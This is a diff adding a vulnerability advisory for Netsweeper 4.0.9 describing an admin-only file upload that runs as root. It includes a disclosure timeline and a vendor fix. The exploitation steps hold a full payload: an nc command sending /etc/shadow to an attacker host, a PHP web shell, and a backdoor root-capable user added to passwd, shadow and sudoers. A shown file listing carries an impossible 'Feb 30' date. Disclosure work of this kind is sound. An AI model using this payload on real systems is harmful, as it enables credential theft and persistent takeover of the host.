@@ -1,0 +1,67 @@
++--------------------------------------------------------+
++ Netsweeper 4.0.9 - Arbitrary File Upload and Execution +
++--------------------------------------------------------+
+Affected Product: Netsweeper
+Vendor Homepage : www.netsweeper.com
+Version 	: 4.0.9 (and probably other versions)
+Discovered by  	: Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
+Patched      	: Yes
+CVE		: [CVE-2015-PENDING]
+Advisory ID	: [SECUID0-15-005]
+
++---------------------+
++ Product Description +
++---------------------+
+Netsweeper is a software solution specialized in content filtering.
+
++----------------------+
++ Exploitation Details +
++----------------------+
+Netsweeeper 4.0.9 (and probably other versions) allows an authenticated user with admin privileges, to upload arbitrary PHP code (eg PHP shell) and further execute it with root rights.
+
+To replicate the bug:
+1. Login as admin at https://<netsweeper>/webadmin
+2. Go to System Tools | System Configuration	
+3. Select "Routes Advertising Service" then Add new Peer, and add the below:
+4. At Peer Address (enter <netsweeper>'s IP, you may also use its default IP 192.168.100.100): 192.168.100.100 
+5. Comment: pwn3d
+6. At File Template (copy and paste the below):
+-----code snippet-----
+#!/bin/sh
+/usr/bin/nc <attacker_ip> 1234 < /etc/shadow
+
+echo "<?php if(isset(\$_REQUEST['c'])){echo \"<pre>\";\$c=(\$_REQUEST['c']);system(\$c);echo \"</pre>\";die;} ?>" > /usr/local/netsweeper/webadmin/logs/secuid0.php
+
+echo "secuid0:x:501:500::/tmp/:/bin/bash" >> /etc/passwd
+#set secuid0 password to "secuid0"
+echo "secuid0:\$1\$h8DmA\$LmWhQ71Bp6u253YOUTdnc0:16452:0:99999:7:::" >> /etc/shadow 
+echo "secuid0     ALL=(ALL)       ALL" >> /etc/sudoers
+
+#secuid0.net
+-----code snippet-----
+
+7. <Click the "Advanced Settings" button to show more fields>
+8. Config file, set it to: /tmp/secuid0.sh
+9. Service Restart Command, set it to: /bin/bash /tmp/secuid0.sh
+10. Set up your netcat listener on port 1234 
+11. Once you submit the above bash script and rest of details ... you will receive a copy of /etc/shadow to your attacker_ip's netcat listener (#10), and also you will be able to interact with the injected php shell from: http://<netsweeper>/webadmin/logs/secuid0.php?c=ls
+
+The injected script /tmp/secuid0.sh will run with root's privileges, so essentially the attacker owns the box and profits.
+	[root@localhost logs]# ls -al /tmp/
+	...
+	-rw-r--r--   1 root   root    219 Feb 30 12:40 secuid0.sh
+	...
+
++----------+
++ Solution +
++----------+
+Upgrade to latest version.
+
++---------------------+
++ Disclosure Timeline +
++---------------------+
+06-Apr-2015: CVE Request
+08-Apr-2015: Issues reported to Netsweeper
+08-Apr-2015: Netsweeper bug ID 15475
+08-Apr-2015: Netsweeper response, tickets opened and issues will be resolved in the 4.0.11 and 4.1.5 releases
+11-Aug-2015: Public disclosure
